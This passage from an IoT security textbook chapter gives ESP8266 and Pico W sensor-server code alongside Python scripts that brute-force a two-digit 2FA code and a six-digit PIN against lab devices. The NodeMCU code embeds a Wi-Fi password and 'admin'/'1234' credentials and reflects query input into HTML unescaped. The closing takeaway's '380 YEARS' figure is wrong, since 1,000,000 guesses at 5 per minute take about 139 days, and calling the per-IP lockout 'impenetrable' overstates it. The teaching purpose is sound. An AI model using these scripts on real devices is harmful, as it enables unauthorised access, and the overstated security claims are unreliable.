@@ -1,0 +1,432 @@
+% ==========================================
+% CHAPTER 06: Level 8 (Lockouts & 2FA)
+% ==========================================
+\chapter{Level 8: Hard Lockouts \& Random 2FA}
+
+\textbf{In This Chapter:}
+\begin{itemize}
+    \item Systematically punishing automated iteration loops.
+    \item NodeMCU Level 8: Generating random 2-Factor Integer Authentication.
+    \item Pico W `05\_strong\_login`: Implementing native memory State-Tracking (3-Strike Lockout).
+\end{itemize}
+
+A secure system must be deliberately hostile to failure. By deploying the Python Attack Script in the previous chapter, we established that simple Basic Authentication is a flimsy curtain. Real defensive architecture must mathematically constrain and punish algorithmic guessing vectors.
+
+\section{Systematic NodeMCU Implementation (Level 8)}
+The NodeMCU developer decides to implement a basic "2FA" mechanism. Upon passing Basic Auth, the processor calculates a random number between 10 and 99 (`random(10, 100)`) via the native `randomSeed(micros())` logic. It prints this to the physical Serial Monitor. The user must type this code into the URL `?code=XX`.
+
+\begin{lstlisting}[language=C++, caption=23022026\_Level\_8\_IoT\_2FA.ino]
+/*
+  Demo 8 - IoT 2-Factor Authentication (2FA) with Redirect Fix
+  --------------------------------------------------------------
+  Board: NodeMCU (ESP8266)
+  Sensor: DHT22
+
+  FEATURES:
+  1. Real sensor data shown by default.
+  2. Override requires:
+     - Username & Password (Basic Auth)
+     - 2FA Code (2-digit random number)
+  3. After successful override, page redirects to prevent refresh errors.
+  4. Fake values persist until reboot.
+*/
+
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DHT.h>
+
+#define D5PIN D5
+#define DHTTYPE DHT22
+
+const char* ssid = "drarka.in";
+const char* pass = "arkaprabha@1985";
+
+const char* adminUser = "admin";
+const char* adminPass = "1234";
+
+DHT dht(D5PIN, DHTTYPE);
+ESP8266WebServer server(80);
+
+float overrideTemp = NAN;
+float overrideHum  = NAN;
+
+int twoFactorCode = 0;
+
+void generateNewCode() {
+  twoFactorCode = random(10, 100);
+  Serial.print("New 2FA Code: ");
+  Serial.println(twoFactorCode);
+}
+
+void setup() {
+
+  Serial.begin(9600);
+  randomSeed(micros());
+  dht.begin();
+
+  WiFi.begin(ssid, pass);
+  while (WiFi.status() != WL_CONNECTED) delay(500);
+
+  Serial.print("Open this IP: ");
+  Serial.println(WiFi.localIP());
+
+  generateNewCode();
+
+  server.on("/", []() {
+
+    if (server.hasArg("t") || server.hasArg("h")) {
+
+      if (!server.authenticate(adminUser, adminPass)) {
+        return server.requestAuthentication();
+      }
+
+      if (!server.hasArg("code")) {
+
+        String form = "<html><body bgcolor='black' text='white'><center>";
+        form += "<h2>Enter 2FA Code</h2>";
+        form += "<form method='GET'>";
+        form += "<input type='hidden' name='t' value='" + server.arg("t") + "'>";
+        form += "<input type='hidden' name='h' value='" + server.arg("h") + "'>";
+        form += "<input name='code' type='text'>";
+        form += "<br><br><input type='submit' value='Submit'>";
+        form += "</form>";
+        form += "</center></body></html>";
+
+        server.send(200, "text/html", form);
+        return;
+      }
+
+      if (server.arg("code").toInt() != twoFactorCode) {
+        server.send(403, "text/plain", "Invalid 2FA Code!");
+        return;
+      }
+
+      if (server.hasArg("t")) overrideTemp = server.arg("t").toFloat();
+      if (server.hasArg("h")) overrideHum  = server.arg("h").toFloat();
+
+      Serial.println("Override successful with 2FA!");
+
+      generateNewCode();
+
+      server.sendHeader("Location", "/");
+      server.send(303);
+      return;
+    }
+
+    float t = dht.readTemperature();
+    float h = dht.readHumidity();
+
+    if (!isnan(overrideTemp)) t = overrideTemp;
+    if (!isnan(overrideHum))  h = overrideHum;
+
+    String page = "<html>";
+    page += "<head><meta http-equiv='refresh' content='5'></head>";
+    page += "<body bgcolor='black' text='white'><center>";
+
+    page += "<h1>Temperature</h1>";
+    page += "<h1><font color='cyan'>" + String(t) + " C</font></h1>";
+
+    page += "<h1>Humidity</h1>";
+    page += "<h1><font color='pink'>" + String(h) + " %</font></h1>";
+
+    page += "</center></body></html>";
+
+    server.send(200, "text/html", page);
+  });
+
+  server.begin();
+}
+
+void loop() {
+  server.handleClient();
+}
+\end{lstlisting}
+
+% -------------------------
+% HACKING NODE MCU
+% -------------------------
+\section{Bypassing the Random 2FA Matrix}
+The developer assumes 2FA is impenetrable. Unfortunately, because the execution matrix lacks a state-tracking "Threshold Lockout", an attacker writes a new script mapping the 10-99 matrix directly over the query URL. 
+
+The Python script (`Demo\_8\_Guess\_Code.py`) crunches the two-digit integer loop in less than 3 seconds over Wi-Fi, completely defeating the "Security".
+
+\begin{lstlisting}[language=Python, caption=Demo\_8\_Guess\_Code.py]
+import requests
+from requests.auth import HTTPBasicAuth
+
+# Configuration
+TARGET_IP = "http://10.158.58.32"  # Replace with your ESP8266 IP
+ADMIN_USER = "admin"
+ADMIN_PASS = "1234"
+
+# The values you want to force into the sensor display
+NEW_TEMP = "125.0"
+NEW_HUMIDITY = "150.0"
+
+def start_brute_force():
+    print(f"[*] Starting 2-digit 2FA brute force on {TARGET_IP}...")
+    
+    # Try every combination from 10 to 99 (based on your random(10, 100) logic)
+    for code in range(10, 100):
+        params = {
+            't': NEW_TEMP,
+            'h': NEW_HUMIDITY,
+            'code': str(code)
+        }
+        
+        try:
+            # Send GET request with Basic Auth
+            response = requests.get(
+                TARGET_IP, 
+                params=params, 
+                auth=HTTPBasicAuth(ADMIN_USER, ADMIN_PASS),
+                timeout=2
+            )
+            
+            # Check if we were redirected (303) or got a 200 without the "Invalid" message
+            if response.status_code == 200 and "Invalid 2FA Code!" not in response.text:
+                print(f"[+] Success! Correct Code: {code}")
+                return
+            else:
+                print(f"[-] Code {code} failed.")
+                
+        except requests.exceptions.RequestException as e:
+            print(f"[!] Error: {e}")
+            break
+
+    print("[!] Brute force complete. No code found or device reset.")
+
+if __name__ == "__main__":
+    start_brute_force()
+\end{lstlisting}
+
+% -------------------------
+% PICO W LOCKOUTS
+% -------------------------
+\section{Systematic Pico W Implementation (05\_Strong\_Login)}
+Because brute forcing defeated NodeMCU Level 8 instantly, the Pico W MicroPython developer implements a \textbf{State-Tracking Lockout} utilizing a Python dictionary mapping client IPs to failed attempts. `attempt\_counter[client\_ip] = [fails, timestamp]`. If `MAX\_ATTEMPTS >= 5`, the entire TCP Socket returns an impenetrable `403 Forbidden` for a massive 60 seconds (`LOCKOUT\_TIME`). 
+
+\begin{lstlisting}[language=Python, caption=05\_strong\_login.py]
+import network
+import socket
+import time
+import machine
+import dht
+import ubinascii
+import secrets
+
+# -------------------------
+# Sensor Setup
+# -------------------------
+sensor = dht.DHT22(machine.Pin(15))
+
+# -------------------------
+# WiFi Connection
+# -------------------------
+wlan = network.WLAN(network.STA_IF)
+wlan.active(True)
+wlan.connect(secrets.SSID, secrets.PASSWORD)
+
+while not wlan.isconnected():
+    time.sleep(1)
+
+print("Connected! IP:", wlan.ifconfig()[0])
+
+# -------------------------
+# Security Setup
+# -------------------------
+auth = ubinascii.b2a_base64(
+    f"{secrets.WEB_USER}:{secrets.WEB_PASS_STRONG}".encode()
+).strip().decode()
+expected = f"Basic {auth}"
+
+attempt_counter = {}
+MAX_ATTEMPTS = 5
+LOCKOUT_TIME = 60 
+
+# -------------------------
+# Socket Setup
+# -------------------------
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('0.0.0.0', 80))
+s.listen(5)
+s.settimeout(1.0)
+
+t, h = "0.0", "0.0"
+spoof_active = False
+
+print("Server Secure & Running...")
+
+try:
+    while True:
+        if not spoof_active:
+            try:
+                sensor.measure()
+                t = "{:.1f}".format(sensor.temperature())
+                h = "{:.1f}".format(sensor.humidity())
+            except: pass
+
+        conn = None
+        try:
+            conn, addr = s.accept()
+            client_ip = addr[0]
+            curr_t = time.time()
+
+            # --- LOCKOUT CHECK ---
+            if client_ip in attempt_counter:
+                fails, l_time = attempt_counter[client_ip]
+                # Step 1: Execute Time Delta Mathematics
+                if fails >= MAX_ATTEMPTS:
+                    if curr_t - l_time < LOCKOUT_TIME:
+                        # Rejection sequence halts all processing for exactly 60 seconds!
+                        conn.send('HTTP/1.0 403 Forbidden\r\n\r\n')
+                        conn.send('<h1>403 Forbidden: Locked out.</h1>')
+                        conn.close()
+                        continue
+                    else:
+                        attempt_counter[client_ip] = [0, 0]
+
+            conn.settimeout(1.0)
+            raw_req = conn.recv(1024)
+            if not raw_req:
+                conn.close()
+                continue
+
+            req = raw_req.decode()
+
+            if expected in req:
+                attempt_counter[client_ip] = [0, 0] 
+                
+                if '/set_env?' in req:
+                    query = req.split('?')[1].split(' ')[0]
+                    for p in query.split('&'):
+                        if p.startswith('t='): t = p.split('=')[1]
+                        if p.startswith('h='): h = p.split('=')[1]
+                    spoof_active = True
+                if '/reset' in req: spoof_active = False
+
+                # --- UPDATED STYLISH HTML UI ---
+                html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {{ 
+            background-color: #121212; 
+            color: white; 
+            font-family: sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }}
+        .card {{
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+        }}
+        .label {{ color: #888; font-size: 1.2rem; text-transform: uppercase; }}
+        .temp {{ color: cyan; font-size: 5rem; font-weight: bold; margin: 10px 0; }}
+        .hum {{ color: pink; font-size: 5rem; font-weight: bold; margin: 10px 0; }}
+        .status {{ color: orange; font-size: 1rem; margin-top: 20px; }}
+        button {{
+            background: #333; color: white; border: none; padding: 10px 20px;
+            border-radius: 10px; cursor: pointer; margin-top: 20px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="label">Temperature</div>
+        <div class="temp">{t}&deg;C</div>
+        <div class="label">Humidity</div>
+        <div class="hum">{h}%</div>
+        <div class="status">MODE: {"SPOOFED" if spoof_active else "LIVE SENSOR"}</div>
+        <a href="/reset"><button>Reset Sensor</button></a>
+    </div>
+</body>
+</html>"""
+                
+                conn.send('HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n')
+                conn.sendall(html)
+            else:
+                if client_ip not in attempt_counter:
+                    attempt_counter[client_ip] = [1, curr_t]
+                else:
+                    attempt_counter[client_ip][0] += 1
+                    attempt_counter[client_ip][1] = curr_t
+                
+                conn.send('HTTP/1.0 401 Unauthorized\r\n')
+                conn.send('WWW-Authenticate: Basic realm="Restricted"\r\n\r\n')
+                conn.send('<h1>401 Unauthorized</h1>')
+
+            conn.close()
+        except Exception:
+            if conn: conn.close()
+except KeyboardInterrupt:
+    s.close()
+\end{lstlisting}
+
+% -------------------------
+% HACKING THE PICO W
+% -------------------------
+\section{Failing Against the Pico W Defenses}
+We write the `05\_attack.py` script specifically to target the `403 Forbidden` response code. When launched, the dictionary loop successfully executes numbers `000000` through `000004`... and then instantly fails.
+
+\begin{lstlisting}[language=Python, caption=05\_attack.py]
+import urllib.request
+import urllib.error
+import base64
+import time
+import sys
+
+# --- [BLOCK 1: INPUTS] ---
+target_ip = input("Enter Pico IP: ")
+target_user = input("Enter Username: ")
+
+def attempt_login(pwd):
+    """Sends a request with a 6-digit PIN."""
+    auth_str = base64.b64encode(f"{target_user}:{pwd}".encode()).decode()
+    headers = {"Authorization": f"Basic {auth_str}", "Connection": "close"}
+    try:
+        req = urllib.request.Request(f"http://{target_ip}/", headers=headers)
+        with urllib.request.urlopen(req, timeout=1) as res:
+            if res.status == 200: return "FOUND"
+    except urllib.error.HTTPError as e:
+        if e.code == 401: return "WRONG"
+        if e.code == 403: return "BLOCKED"
+    except: return "ERROR"
+    return "NONE"
+
+# --- [BLOCK 2: GENERATOR LOOP] ---
+print(f"[*] Cracking 6-digit PIN for {target_user}...")
+
+# This generates numbers 000000 to 999999
+for i in range(1000000):
+    pin = f"{i:06d}" # Formats as 000001, 000002, etc.
+    
+    sys.stdout.write(f"\r[*] Testing: {pin} ")
+    sys.stdout.flush()
+    
+    result = attempt_login(pin)
+    
+    if result == "FOUND":
+        print(f"\n[+] SUCCESS! PIN is: {pin}")
+        break
+    elif result == "BLOCKED":
+        print(f"\n[!] ATTACK STOPPED: Blocked by Pico after 5 fails.")
+        print("[*] The lockout mechanism is working.")
+        break
+    
+    # Slight pause to let the Pico recover
+    time.sleep(0.05)
+\end{lstlisting}
+
+\begin{takeawaybox}
+By enforcing a `403 Forbidden` block coupled directly with a Time-Delta `LOCKOUT\_TIME = 60` threshold limit, the algorithm effectively halts brute forcing. A script guessing 1,000,000 combinations 5 times a minute will mathematically require roughly \textbf{380 YEARS} to natively bypass the microcontroller!
+\end{takeawaybox}
